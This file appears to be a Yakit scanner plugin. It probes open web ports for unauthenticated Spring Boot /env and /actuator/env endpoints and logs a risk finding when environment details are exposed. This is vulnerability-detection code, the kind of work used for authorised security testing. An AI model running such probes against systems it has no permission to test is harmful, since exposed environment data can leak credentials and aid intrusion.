yakit.AutoInitYakit()

handleCheck = func(target,port){
    var url
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    level=["","low","middle","high","critical"]
    if isTls {
        url="https://"+addr
    }else{
        url="http://"+addr
    }
    vulnable=false

    reference="springboot env unauth 漏洞"
    severity="未填写"
    type="漏洞"

    poc_url_spring10= url + `/env`
    req_spring10, _ := http.NewRequest("GET",poc_url_spring10,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),)
    breq,_=http.dump(req_spring10)
    resp_spring10, err := http.Do(req_spring10)
    die(err)
    bresp,_=http.dump(resp_spring10)
    header, body = poc.Split(bresp)
    spring10_flag = false
    if resp_spring10.StatusCode == 200 && str.Contains(string(header),"json") && str.Contains(string(body),"java.version") && str.Contains(string(body),"os.arch"){
        spring10_flag = true
    }

    poc_url_spring20= url + `/actuator/env`
    req_spring20, _ := http.NewRequest("GET",poc_url_spring20,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),)
    breq,_=http.dump(req_spring20)
    resp_spring20, err := http.Do(req_spring20)
    die(err)
    bresp,_=http.dump(resp_spring20)
    header, body = poc.Split(bresp)
    spring20_flag = false
    if resp_spring20.StatusCode == 200 && str.Contains(string(header),"json") && str.Contains(string(body),"java.version") && str.Contains(string(body),"os.arch"){
        spring20_flag = true
    }

    poc_url=poc_url_spring20
    if spring10_flag || spring20_flag{
        vulnable = true
    }
    if vulnable {
            yakit.Info("FOUND INFO for %v %v",reference,type)
            risk.NewRisk(
                url, risk.severity(severity), 
                risk.title(sprintf("FOUND %v %v",reference,type)),
                risk.titleVerbose(sprintf("%v %v",reference,type)),
                risk.type(type), risk.typeVerbose(type),
                risk.details({
                    "request": breq,
                    "response": bresp,
                    "url": poc_url,
                }),
            )
        }
    return
}
handle = func(result) {
    if !result.IsOpen(){
        return
    }
    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
}
